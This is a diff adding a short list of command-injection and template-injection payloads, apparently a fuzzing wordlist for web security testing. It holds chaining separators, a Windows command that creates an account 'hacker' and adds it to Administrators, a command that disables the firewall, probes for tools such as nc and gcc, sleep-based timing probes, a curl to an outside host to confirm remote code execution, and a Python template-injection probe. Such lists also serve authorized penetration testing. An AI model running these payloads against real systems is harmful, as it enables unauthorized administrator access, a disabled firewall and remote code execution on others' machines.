@@ -1,0 +1,22 @@
+| net localgroup Administrators hacker /ADD
+| 
+which python
+sleep 1
+| net user hacker Password1 /ADD
+which perl
+& 
+& net user hacker Password1 /ADD
+netsh firewall set opmode disable
+|| 
+which nc
+sleep 10
+net localgroup Administrators hacker /ADD
+curl https://crowdshield.com/.testing/rce_vuln.txt
+which gcc
+net user hacker Password1 /ADD
+{{[] .__ Class __.__ base __.__ subclasses __ ()}}
+which curl
+& net localgroup Administrators hacker /ADD
+which wget
+sleep 5
+`
